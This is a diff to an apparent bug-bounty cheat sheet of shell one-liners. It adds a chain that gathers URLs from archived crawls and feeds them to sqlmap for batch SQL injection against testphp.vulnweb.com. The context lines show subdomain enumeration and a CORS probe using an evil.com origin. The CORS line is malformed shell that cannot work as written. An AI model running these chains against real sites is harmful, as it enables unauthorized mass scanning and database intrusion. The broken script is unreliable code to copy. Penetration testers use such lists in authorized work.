@@ -132,3 +132,9 @@ subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; 
 ```
 site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
 ```
+
+## SQL Injection
+> @ofjaaah
+```
+findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
+```
